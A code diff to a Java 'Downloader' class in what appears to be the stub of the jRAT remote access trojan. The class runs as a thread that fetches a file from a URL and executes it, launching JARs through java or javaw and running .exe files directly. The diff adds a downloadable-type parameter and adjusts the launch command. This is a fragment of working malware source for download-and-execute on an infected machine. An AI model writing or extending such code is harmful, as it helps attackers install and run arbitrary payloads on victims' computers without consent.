@@ -9,17 +9,20 @@ import java.net.URLConnection;
 import java.util.Random;
 
 import pro.jrat.common.OperatingSystem;
+import pro.jrat.common.downloadable.Downloadable;
 import pro.jrat.stub.utils.Utils;
 
 
 public class Downloader extends Thread {
 
-	public String url;
-	public boolean update;
+	private String url;
+	private boolean update;
+	private Downloadable type;
 
-	public Downloader(String url, boolean update) {
+	public Downloader(String url, boolean update, String type) {
 		this.url = url;
 		this.update = update;
+		this.type = Downloadable.get(type);
 	}
 
 	public void run() {
@@ -95,7 +98,7 @@ public class Downloader extends Thread {
 						if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 							Runtime.getRuntime().exec(new String[] { System.getProperty("java.home") + "\\bin\\javaw.exe", "-jar", file.getAbsolutePath() });
 						} else {
-							Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath().replace(" ", "%20") });
+							Runtime.getRuntime().exec(new String[] { "java", "-jar", file.getAbsolutePath() });
 						}
 					} else if (fileName.toLowerCase().endsWith("exe")) {
 						Runtime.getRuntime().exec(new String[] { file.getAbsolutePath() });
